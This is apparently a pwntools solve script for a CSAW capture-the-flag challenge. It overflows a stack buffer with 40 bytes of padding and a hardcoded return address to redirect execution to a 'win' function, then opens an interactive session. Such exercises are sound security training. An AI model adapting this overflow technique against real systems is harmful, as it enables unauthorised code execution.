from pwn import *

p = remote('pwn.chal.csaw.io', 1002)
payload = ''
# diff between buf and srip
payload += "A" * 40
# address we want is the third instruction in the win function, not the first
# this is because we're returning from main, we don't want to be pushing a new stack frame nor do we need to.
payload += "\x5b\x06\x40\x00\x00\x00\x00\x00"

print(p.recv(timeout=1))
p.sendline(payload)
print(p.recv(timeout=1))
p.interactive()
